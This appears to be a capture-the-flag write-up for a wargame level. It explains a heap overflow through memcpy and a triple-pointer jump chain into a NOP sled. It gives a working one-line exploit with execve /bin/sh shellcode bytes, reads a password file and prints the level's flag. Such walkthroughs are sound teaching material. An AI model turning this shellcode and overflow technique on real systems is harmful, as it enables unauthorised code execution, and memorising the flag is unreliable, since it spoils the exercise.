# level9

The executable does the following :

- Allocate two `unsigned int`, `s1` and `s2`
- Run `memcpy` on `s1 + 4`
- Run `s2` as a function after three dereferences, or `***s2()`

We'll use `memcpy` to overflow in `s2`, and then make it point (after two jumps) to a shellcode in the buffer.

## **The addresses**

In `gdb`, we get the addresses of `s1` and `s2` using breaks after the `new` :

- `s1` is at `0x804a008`
- `s2` is at `0x804a078`

`0x78 - 0x08 = 0x70 = 112`, and `memcpy` runs at `s1 + 4`, so we have `108` characters before our spoofed address.

Reusing our 45-byte shellcode from before, we can start with a simple buffer :

```
NOP * 63 (nopesled) + SHELLCODE (45 bytes) + 0x0804a00c (address of s1 + 4)
 ^------------------------------------------------'
```

## **The jumps**

But we have to remember : this would only work if the code ran `*s2()`.

The address dereferenced (here `0x0804a00c`, the beginning of our buffer) will be dereferenced as well. We make it point to its neighbor :

```
     ,--------v
0x0804a010 + NOP * 59 (nopesled) + SHELLCODE (45 bytes) + 0x0804a00c (address of s1 + 4)
     ^---------------------------------------------------------'
```

Now this works for `**s2()`.

We add one more jump :

```
     ,------------v
0x0804a010 + 0x0804a014 + NOP * 55 (nopesled) + SHELLCODE (45 bytes) + 0x0804a00c (address of s1 + 4)
     ^             `-------^                                                |
     `----------------------------------------------------------------------'
```

Now it works for `***s2()`.

We format this to use it and run :

```
./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x14\xa0\x04\x08" + "\x90" * 55 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x0c\xa0\x04\x08")')
```

## **The flag**

It works ! In our interactive shell, we run :

```
cat /home/user/bonus0/.pass
```

... and get the flag for `level9` :

```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```